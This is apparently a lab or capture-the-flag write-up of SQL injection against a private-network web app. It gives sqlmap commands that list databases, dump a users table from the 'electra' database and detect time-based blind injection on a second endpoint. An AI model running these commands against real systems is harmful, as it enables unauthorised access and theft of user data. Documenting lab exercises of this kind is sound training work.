We already know that `/lookup?connection=` is injectable so we'll begin with running sqlmap against it. `sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch --dbs` turns up the following warning:

<img width="1803" height="357" alt="image" src="https://github.com/user-attachments/assets/5e15bf32-7134-49b9-8e56-5581f9b82ede" />

We then run `sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch -D electra -T users --dump` which provides us with the dumped users table (the dumped csv can be found at `~/.local/share/sqlmap/output/192.168.77.80/dump/electra/users.csv`):

<img width="1929" height="718" alt="image" src="https://github.com/user-attachments/assets/baf08b30-b3ce-4880-938e-c4e4284db678" />

We also know that `/quick/check?connection=` should be vulnerable as well. We can run `sqlmap -u "http://192.168.77.80/quick/check?connection=1" --batch --level=2` which turns up a time-based blind injection.

<img width="1025" height="143" alt="image" src="https://github.com/user-attachments/assets/6ea60c69-4719-4884-b84e-220d03274019" />
